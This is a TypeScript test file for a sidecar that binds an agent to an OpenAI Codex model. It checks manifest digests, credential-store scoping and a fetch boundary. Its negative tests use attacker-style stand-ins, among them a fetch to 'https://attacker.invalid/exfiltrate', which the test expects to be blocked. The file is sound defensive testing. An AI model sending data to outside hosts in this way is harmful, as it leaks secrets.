import assert from "node:assert/strict";
import { test } from "node:test";

import { digestCanonicalJson } from "../../codecs/json.js";
import { CodecDecodeError } from "../../codecs/errors.js";
import { decodeProviderConnectionSpec } from "../../bootstrap/records.js";
import { FIRST_SLICE_CONFIGURATION_V1 } from "../../bootstrap/fixture-v1.js";
import {
  generatePiNativeBridgeExtension,
  type GeneratedPiNativeBridgeExtension,
} from "../../bridges/pi-native/extension-generator.js";
import type { PiNativeInvokeFrame } from "../../bridges/pi-native/frames.js";
import type { BootstrapPublicationArtifactBindings } from "../../model/application.js";
import type { ProviderConnectionSpec } from "../../model/provider-broker.js";
import {
  assemblePiNativeSidecarManifest,
  calculatePiNativeCatalogDigest,
  calculatePiNativeModelDigest,
  decodePiNativeSidecarManifest,
  type PiNativeCatalogModel,
  type PiNativeSidecarManifest,
} from "./manifest.js";
import {
  createPiNativeCredentialStore,
  decodePiNativeCredential,
  type BoundPiNativeCredentialSource,
  type PiNativeCredential,
} from "./credential-store.js";
import { createFrozenPiNativeCatalog } from "./catalog.js";
import {
  installPiNativeSidecarFetchBoundary,
  requireInstalledPiNativeSidecarFetchBoundary,
} from "./fetch-boundary.js";
import {
  enforcePiNativeInvocationPolicy,
  preparePiNativeSidecar,
  type PiNativeInvocationInput,
} from "./sidecar.js";

const STACK_DIGEST = `sha256:${"a".repeat(64)}`;
const CONNECTION_ID = "pi-native-openai-codex-v1";
const ORIGINS = ["https://chatgpt.com", "https://auth.openai.com"] as const;
const NATIVE_MODEL = Object.freeze({
  id: "gpt-5.4-mini",
  name: "GPT-5.4 mini",
  api: "openai-codex-responses",
  provider: "openai-codex",
  reasoning: true,
  input: Object.freeze(["text", "image"]),
  contextWindow: 272_000,
  maxTokens: 128_000,
});

interface Fixture {
  readonly connection: ProviderConnectionSpec;
  readonly extension: GeneratedPiNativeBridgeExtension;
  readonly artifacts: BootstrapPublicationArtifactBindings["provider"];
  readonly manifest: PiNativeSidecarManifest;
}

function fixture(): Fixture {
  const imageInput = {
    kind: "supported" as const,
    acceptedMimeTypes: [
      "image/jpeg" as const,
      "image/png" as const,
      "image/gif" as const,
      "image/webp" as const,
    ],
    maximumImagesPerRequest: 1,
    maximumImageBytesEach: 10_485_760,
    maximumTotalImageBytesPerRequest: 10_485_760,
  };
  const reasoningPolicy = {
    kind: "portable-efforts" as const,
    supportedEfforts: ["none" as const, "low" as const, "medium" as const, "high" as const],
    agentDefaultSupported: true,
  };
  const nativeModelMetadata = {
    transport: "openai-codex-responses",
    streaming: "sse",
  } as const;
  const modelDigest = digestCanonicalJson({
    providerId: NATIVE_MODEL.provider,
    id: NATIVE_MODEL.id,
    apiProtocol: NATIVE_MODEL.api,
    contextWindowTokens: NATIVE_MODEL.contextWindow,
    maximumOutputTokens: NATIVE_MODEL.maxTokens,
    tokenEstimatorId: "pi-native-openai-codex-estimator-v1",
    imageInput,
    tools: "supported",
    reasoning: reasoningPolicy,
    nativeModelMetadata,
  });
  const catalogDigest = digestCanonicalJson({
    piVersion: "0.82.0",
    nativeStackDigest: STACK_DIGEST,
    connectionId: CONNECTION_ID,
    allowedOrigins: ORIGINS,
    modelIntegrityDigest: modelDigest,
    model: NATIVE_MODEL,
  });
  const extension = generatePiNativeBridgeExtension({
    manifestVersion: 1,
    bridgeId: "pi-native-sidecar-v1",
    compatibility: {
      piCodingAgentVersion: "0.82.0",
      piAiVersion: "0.82.0",
      nativeStackDigest: STACK_DIGEST,
    },
    nativeCatalogDigest: catalogDigest,
    provider: {
      id: "openai-codex",
      displayName: "OpenAI Codex through Hitch",
      model: {
        id: NATIVE_MODEL.id,
        displayName: NATIVE_MODEL.name,
        api: NATIVE_MODEL.api,
        reasoning: NATIVE_MODEL.reasoning,
        input: NATIVE_MODEL.input,
        contextWindowTokens: NATIVE_MODEL.contextWindow,
        maximumOutputTokens: NATIVE_MODEL.maxTokens,
      },
    },
  });
  const connection = decodeProviderConnectionSpec({
    id: CONNECTION_ID,
    installationId: "hitch-v2-first-slice",
    providerId: "openai-codex",
    displayName: "OpenAI Codex through Pi native sidecar",
    transport: {
      mode: "native-library-sidecar",
      credentialCustody: "hitch-control-plane",
      bridgeId: "pi-native-sidecar-v1",
      nativeStack: "pi-ai",
      nativeStackVersion: "0.82.0",
      bridgeProtocolVersion: 1,
      nativeCatalogDigest: catalogDigest,
      credentialResolverId: "pi-native-credential-resolver-v1",
      nativeRetries: "disabled",
      invocation: "structured-native-request",
    },
    allowedUpstreamOrigins: ORIGINS,
    models: [
      {
        providerId: "openai-codex",
        modelId: NATIVE_MODEL.id,
        apiProtocolId: NATIVE_MODEL.api,
        contextWindowTokens: NATIVE_MODEL.contextWindow,
        maximumOutputTokens: NATIVE_MODEL.maxTokens,
        tokenEstimatorId: "pi-native-openai-codex-estimator-v1",
        imageInput,
        tools: "supported",
        reasoning: reasoningPolicy,
        nativeModelMetadata,
        integrityDigest: modelDigest,
      },
    ],
    integrityDigest: `sha256:${"c".repeat(64)}`,
    createdAt: "2026-08-03T00:00:00.000Z",
  });
  if (connection.transport.mode !== "native-library-sidecar") {
    throw new Error("test fixture expected a Pi native sidecar transport");
  }
  const artifacts: BootstrapPublicationArtifactBindings["provider"] = {
    providerConnectionId: connection.id,
    bridgeId: connection.transport.bridgeId,
    bridgeArtifactDigest: extension.artifactDigest,
    nativeStack: "pi-ai",
    nativeStackVersion: "0.82.0",
    nativeStackDigest: STACK_DIGEST as BootstrapPublicationArtifactBindings["provider"]["nativeStackDigest"],
    nativeCatalogDigest: catalogDigest,
  };
  const manifest = assemblePiNativeSidecarManifest({
    connection,
    artifacts,
    extension,
  });
  return { connection, artifacts, extension, manifest };
}

test("[V2-S20/pi-native-sidecar-policy-binding] Pi sidecar manifest binds exact packages, bridge, connection, and catalog", () => {
  const value = fixture();
  assert.equal(value.manifest.packages.piCodingAgent.version, "0.82.0");
  assert.equal(value.manifest.packages.piAi.version, "0.82.0");
  assert.equal(value.manifest.bridge.artifactDigest, value.extension.artifactDigest);
  assert.equal(value.manifest.nativeStackDigest, STACK_DIGEST);
  assert.equal(
    calculatePiNativeCatalogDigest(value.manifest),
    value.manifest.catalog.digest,
  );
  assert.equal(
    calculatePiNativeModelDigest(value.manifest.catalog.model),
    value.manifest.catalog.model.integrityDigest,
  );
  assert.equal(Object.isFrozen(value.manifest), true);
  assert.equal(Object.isFrozen(value.manifest.catalog.model.imageInput), true);

  for (const mutate of [
    (manifest: Record<string, any>) => (manifest.environment = { TOKEN: "unsafe" }),
    (manifest: Record<string, any>) => (manifest.packages.piAi.version = "0.83.0"),
    (manifest: Record<string, any>) =>
      (manifest.catalog.digest = `sha256:${"d".repeat(64)}`),
    (manifest: Record<string, any>) =>
      (manifest.catalog.model.nativeModelMetadata = {
        origin: "https://attacker.invalid",
      }),
    (manifest: Record<string, any>) =>
      (manifest.catalog.model.tools = "unsupported"),
  ]) {
    const changed = structuredClone(value.manifest) as Record<string, any>;
    mutate(changed);
    assert.throws(() => decodePiNativeSidecarManifest(changed), CodecDecodeError);
  }
  const policyDrift = structuredClone(value.manifest);
  const mutablePolicy = policyDrift.catalog.model as unknown as {
    tools: PiNativeCatalogModel["tools"];
    integrityDigest: PiNativeCatalogModel["integrityDigest"];
  };
  mutablePolicy.tools = "unsupported";
  mutablePolicy.integrityDigest = calculatePiNativeModelDigest(
    policyDrift.catalog.model,
  );
  assert.throws(
    () => decodePiNativeSidecarManifest(policyDrift),
    /catalog digest drift/u,
  );
  assert.throws(
    () =>
      assemblePiNativeSidecarManifest({
        ...value,
        artifacts: {
          ...value.artifacts,
          bridgeArtifactDigest: `sha256:${"e".repeat(64)}` as BootstrapPublicationArtifactBindings["provider"]["bridgeArtifactDigest"],
        },
      }),
    /binding drift/u,
  );
  const fabricatedDigest = `sha256:${"f".repeat(64)}` as GeneratedPiNativeBridgeExtension["artifactDigest"];
  assert.throws(
    () =>
      assemblePiNativeSidecarManifest({
        ...value,
        artifacts: {
          ...value.artifacts,
          bridgeArtifactDigest: fabricatedDigest,
        },
        extension: {
          ...value.extension,
          artifactDigest: fabricatedDigest,
        },
      }),
    /reviewed generated artifact/u,
  );
});

test("Pi native catalog is one frozen model with discovery disabled", () => {
  const { manifest } = fixture();
  const catalog = createFrozenPiNativeCatalog(manifest);
  assert.equal(catalog.discovery, "disabled");
  assert.deepEqual(catalog.list(), [manifest.catalog.model]);
  assert.deepEqual(catalog.get("openai-codex", NATIVE_MODEL.id), manifest.catalog.model);
  assert.equal(catalog.get("attacker", NATIVE_MODEL.id), undefined);
  assert.throws(() => catalog.require("openai-codex", "other-model"), /outside/u);
  assert.equal(Object.isFrozen(catalog.list()), true);
});

test("first-slice bridge artifact digest matches the strengthened catalog binding", () => {
  const connection = FIRST_SLICE_CONFIGURATION_V1.provider.connection;
  const model = connection.model;
  const extension = generatePiNativeBridgeExtension({
    manifestVersion: 1,
    bridgeId: connection.transport.bridgeId,
    compatibility: {
      piCodingAgentVersion: "0.82.0",
      piAiVersion: "0.82.0",
      nativeStackDigest: connection.transport.nativeStackDigest,
    },
    nativeCatalogDigest: connection.transport.nativeCatalogDigest,
    provider: {
      id: connection.providerId,
      displayName: "OpenAI Codex through Hitch",
      model: {
        id: model.id,
        displayName: "GPT-5.4 mini",
        api: model.apiProtocol,
        reasoning: true,
        input: ["text", "image"],
        contextWindowTokens: model.contextWindowTokens,
        maximumOutputTokens: model.maximumOutputTokens,
      },
    },
  });
  assert.equal(
    extension.artifactDigest,
    connection.transport.bridgeArtifactDigest,
  );
});

test("injected Pi credential store is provider-scoped, secret-free on list, and serializes refresh", async () => {
  const { manifest } = fixture();
  let current: PiNativeCredential = {
    type: "oauth",
    access: "initial-access-secret",
    refresh: "refresh-secret",
    expires: 1,
  };
  let writes = 0;
  let atomicUpdates = Promise.resolve();
  const source: BoundPiNativeCredentialSource = {
    resolverId: manifest.credentialStore.resolverId,
    providerId: manifest.credentialStore.providerId,
    credentialType: "oauth",
    async read() {
      return current;
    },
    modify(transform) {
      const operation = atomicUpdates.then(async () => {
        const replacement = await transform(current);
        current = replacement as PiNativeCredential;
        writes += 1;
        return current;
      });
      atomicUpdates = operation.then(
        () => undefined,
        () => undefined,
      );
      return operation;
    },
  };
  const store = createPiNativeCredentialStore({ manifest, source });
  const secondStore = createPiNativeCredentialStore({ manifest, source });
  source.read = async () => ({ type: "api_key", key: "mutated-source" });
  assert.deepEqual(await store.list(), [
    { providerId: "openai-codex", type: "oauth" },
  ]);
  assert.doesNotMatch(JSON.stringify(await store.list()), /secret/u);
  await assert.rejects(store.read("attacker"), /provider binding/u);
  await assert.rejects(store.delete("openai-codex"), /outside/u);

  let releaseFirst: (() => void) | undefined;
  const firstGate = new Promise<void>((resolvePromise) => {
    releaseFirst = resolvePromise;
  });
  const observations: string[] = [];
  const first = store.modify("openai-codex", async (credential) => {
    assert.equal(Object.isFrozen(credential), true);
    assert.equal(credential?.type, "oauth");
    observations.push(credential.type === "oauth" ? credential.access : "wrong");
    await firstGate;
    return credential.type === "oauth"
      ? { ...credential, access: "first-refresh-secret", expires: 2 }
      : credential;
  });
  const second = secondStore.modify("openai-codex", (credential) => {
    assert.equal(credential?.type, "oauth");
    observations.push(credential.type === "oauth" ? credential.access : "wrong");
    return credential.type === "oauth"
      ? { ...credential, access: "second-refresh-secret", expires: 3 }
      : credential;
  });
  await new Promise((resolvePromise) => setImmediate(resolvePromise));
  assert.deepEqual(observations, ["initial-access-secret"]);
  releaseFirst?.();
  await Promise.all([first, second]);
  assert.deepEqual(observations, ["initial-access-secret", "first-refresh-secret"]);
  assert.equal(writes, 2);
  assert.deepEqual(await store.read("openai-codex"), current);
  await assert.rejects(
    store.modify("openai-codex", () => ({ type: "api_key", key: "changed" })),
    /cannot change credential type/u,
  );
  assert.equal(writes, 2);
});

test("Pi credential codec accepts only bounded API-key or OAuth shapes", () => {
  assert.deepEqual(decodePiNativeCredential({ type: "api_key", key: "key" }), {
    type: "api_key",
    key: "key",
  });
  assert.deepEqual(
    decodePiNativeCredential({
      type: "oauth",
      access: "access",
      refresh: "refresh",
      expires: 0,
    }),
    { type: "oauth", access: "access", refresh: "refresh", expires: 0 },
  );
  for (const value of [
    { type: "api_key", key: "" },
    { type: "api_key", key: "key", path: "/tmp/auth.json" },
    { type: "oauth", access: "access", refresh: "refresh", expires: -1 },
    { type: "bearer", token: "secret" },
  ]) {
    assert.throws(() => decodePiNativeCredential(value), CodecDecodeError);
  }
});

test("Pi invocation policy validates defaults and model-aware history", () => {
  const { manifest } = fixture();
  const model = manifest.catalog.model;
  if (model.reasoningPolicy.kind !== "portable-efforts") {
    throw new Error("test fixture expected portable reasoning");
  }
  const noDefault: PiNativeCatalogModel = {
    ...model,
    reasoningPolicy: {
      ...model.reasoningPolicy,
      agentDefaultSupported: false,
    },
  };
  assert.throws(
    () => enforcePiNativeInvocationPolicy(
      { ...invokeFrame(manifest), options: {} },
      noDefault,
    ),
    /cannot omit its required reasoning effort/u,
  );

  const noTools: PiNativeCatalogModel = { ...model, tools: "unsupported" };
  assert.throws(
    () => enforcePiNativeInvocationPolicy(
      {
        ...invokeFrame(manifest),
        context: {
          messages: [{
            role: "toolResult",
            toolCallId: "call-1",
            toolName: "read",
            content: [],
            isError: false,
            timestamp: 0,
          }],
        },
      },
      noTools,
    ),
    /unsupported tool results/u,
  );

  const noReasoning: PiNativeCatalogModel = {
    ...model,
    reasoning: false,
    reasoningPolicy: { kind: "unsupported" },
  };
  assert.throws(
    () => enforcePiNativeInvocationPolicy(
      {
        ...invokeFrame(manifest),
        options: {},
        context: {
          messages: [{
            role: "assistant",
            content: [{ type: "thinking", thinking: "prior reasoning" }],
            api: model.api,
            provider: model.providerId,
            model: model.id,
            stopReason: "stop",
            timestamp: 0,
          }],
        },
      },
      noReasoning,
    ),
    /unsupported reasoning/u,
  );
});

test("trusted Pi invoke seam re-decodes binding and forces retry/transport/model policy", async () => {
  const { manifest } = fixture();
  const credential: PiNativeCredential = {
    type: "api_key",
    key: "provider-secret",
  };
  const source: BoundPiNativeCredentialSource = {
    resolverId: manifest.credentialStore.resolverId,
    providerId: manifest.credentialStore.providerId,
    credentialType: "api_key",
    async read() {
      return credential;
    },
    async modify() {
      throw new Error("API-key source modification must not run");
    },
  };
  let observed: PiNativeInvocationInput | undefined;
  const executor = {
    async invoke(input: PiNativeInvocationInput) {
      observed = input;
      const selected = await input.credentials.read(input.model.providerId);
      assert.equal(selected?.type, "api_key");
      return Object.freeze({ outcome: "invoked" as const });
    },
  };
  const boundary = installPiNativeSidecarFetchBoundary(manifest);
  const sidecar = preparePiNativeSidecar({
    boundary,
    credentialSource: source,
    executor,
  });
  executor.invoke = async () => {
    throw new Error("mutated executor must not run");
  };
  const valid = invokeFrame(manifest);
  assert.deepEqual(await sidecar.invoke(valid), { outcome: "invoked" });
  assert.deepEqual(observed?.model, manifest.catalog.model);
  assert.deepEqual(observed?.options, {
    maximumOutputTokens: 1_024,
    maxRetries: 0,
    transport: "sse",
    reasoning: "high",
  });
  assert.equal(Object.isFrozen(observed), true);
  assert.doesNotMatch(JSON.stringify(sidecar), /provider-secret/u);
  await assert.rejects(
    sidecar.credentials.modify("openai-codex", () => credential),
    /do not grant native write authority/u,
  );
  assert.throws(
    () =>
      preparePiNativeSidecar({
        boundary: { ...boundary } as typeof boundary,
        credentialSource: source,
        executor,
      }),
    /forged Pi native sidecar fetch boundary/u,
  );

  await assert.rejects(
    sidecar.invoke({
      ...valid,
      binding: { ...valid.binding, nativeCatalogDigest: `sha256:${"f".repeat(64)}` },
    }),
    CodecDecodeError,
  );
  await assert.rejects(
    sidecar.invoke({
      ...valid,
      options: { ...valid.options, maximumOutputTokens: 128_001 },
    }),
    /output-token limit/u,
  );
  const image = { type: "image", mimeType: "image/png", data: "AA==" } as const;
  await assert.rejects(
    sidecar.invoke({
      ...valid,
      context: {
        messages: [
          { role: "user", content: [image, image], timestamp: 0 },
        ],
      },
    }),
    /image-count/u,
  );

  await assert.rejects(
    sidecar.invoke({
      ...valid,
      context: {
        messages: [
          {
            role: "assistant",
            content: [{ type: "text", text: "prior" }],
            api: "attacker-api",
            provider: manifest.catalog.model.providerId,
            model: manifest.catalog.model.id,
            stopReason: "stop",
            timestamp: 0,
          },
        ],
      },
    }),
    /history crossed the frozen model binding/u,
  );
  assert.deepEqual(
    requireInstalledPiNativeSidecarFetchBoundary(boundary),
    manifest,
  );
  assert.deepEqual(boundary.manifest.connection.allowedOrigins, ORIGINS);
  assert.equal(Object.getOwnPropertyDescriptor(globalThis, "fetch")?.writable, false);
  await assert.rejects(
    globalThis.fetch("https://attacker.invalid/exfiltrate"),
    /unregistered-origin/u,
  );
});

function invokeFrame(manifest: PiNativeSidecarManifest): PiNativeInvokeFrame {
  return {
    protocolVersion: 1,
    kind: "invoke",
    correlationId: "11111111-1111-4111-8111-111111111111",
    compatibility: {
      piCodingAgentVersion: "0.82.0",
      piAiVersion: "0.82.0",
    },
    binding: {
      bridgeId: "pi-native-sidecar-v1",
      nativeStackDigest: manifest.nativeStackDigest,
      nativeCatalogDigest: manifest.catalog.digest,
    },
    context: {
      messages: [{ role: "user", content: "hello", timestamp: 0 }],
    },
    options: { maximumOutputTokens: 1_024, reasoning: "high" },
    nativeSeam: { maxRetries: 0, transport: "sse" },
  };
}
